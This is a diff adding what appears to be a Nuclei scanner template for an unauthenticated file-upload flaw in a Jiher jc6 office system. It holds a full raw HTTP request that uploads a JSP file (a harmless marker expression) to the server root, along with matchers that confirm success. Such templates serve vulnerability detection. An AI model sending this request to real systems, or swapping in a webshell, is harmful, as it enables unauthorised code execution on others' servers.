@@ -1,0 +1,39 @@
+id: jiher-officeSaveFlag-upload
+info:
+  name: jiher-officeSaveFlag-upload
+  author: apple
+  severity:  critical
+  description: webshell在根目录下，拼接返回文件名。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /jc6/servlet/Upload?officeSaveFlag=2&dbimg=&path=/&setpath=/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 204
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjpa4TxnCv5EpcKHB
+
+        ------WebKitFormBoundaryjpa4TxnCv5EpcKHB
+        Content-Disposition: form-data; name="eform"; filename="test.jsp"
+        Content-Type: application/octet-stream
+
+        <%=123123%>
+        ------WebKitFormBoundaryjpa4TxnCv5EpcKHB
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.jsp'
+      - type: word
+        part: header
+        words:
+          - '200'
